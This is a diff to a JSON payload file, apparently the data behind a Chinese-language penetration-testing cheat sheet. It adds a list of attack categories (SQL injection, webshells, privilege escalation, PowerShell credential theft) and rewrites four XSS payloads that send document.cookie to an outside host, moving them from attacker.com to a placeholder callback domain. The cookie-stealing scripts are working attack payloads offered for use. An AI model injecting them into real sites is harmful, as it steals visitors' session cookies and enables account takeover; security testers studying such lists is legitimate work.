@@ -1,10 +1,16 @@
 {
+  "riskGroups": [
+    "Cookie 窃取", "数据提取", "延时注入", "认证绕过", "Order Union", "报错注入",
+    "RFI", "PHP Wrapper", "Linux / Mac", "Windows", "Java",
+    "基础一句话", "混淆一句话", "图片马", "文件上传利用", "绕过 disable_functions",
+    "Linux SUID 提权", "通配符提权", "PowerShell 文件下载", "PowerShell WLAN 密码", "端口转发"
+  ],
   "xss": {
     "Cookie 窃取": [
-      { "payload": "<script>new Image().src=\"http://attacker.com/steal.php?cookie=\"+document.cookie;</script>", "desc": "Image 标签窃取" },
-      { "payload": "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie;</script>", "desc": "Location 重定向窃取" },
-      { "payload": "<script>fetch('http://attacker.com',{method:'POST',body:document.cookie});</script>", "desc": "Fetch POST 窃取" },
-      { "payload": "<script>new Audio(\"http://attacker.com/steal.php?cookie=\"+document.cookie);</script>", "desc": "Audio 标签窃取" }
+      { "payload": "<script>new Image().src=\"//your-callback.example/?cookie=\"+document.cookie;</script>", "desc": "Image 标签外传（需替换 your-callback.example 为自己的接收端）", "risk": "high" },
+      { "payload": "<script>document.location='//your-callback.example/?cookie='+document.cookie;</script>", "desc": "Location 跳转外传（需替换接收端域名）", "risk": "high" },
+      { "payload": "<script>fetch('//your-callback.example',{method:'POST',body:document.cookie});</script>", "desc": "Fetch POST 外传（需替换接收端域名）", "risk": "high" },
+      { "payload": "<script>new Audio(\"//your-callback.example/?cookie=\"+document.cookie);</script>", "desc": "Audio 标签外传（需替换接收端域名）", "risk": "high" }
     ],
     "基础 XSS": [
       { "payload": "<script>alert('XSS')</script>" },
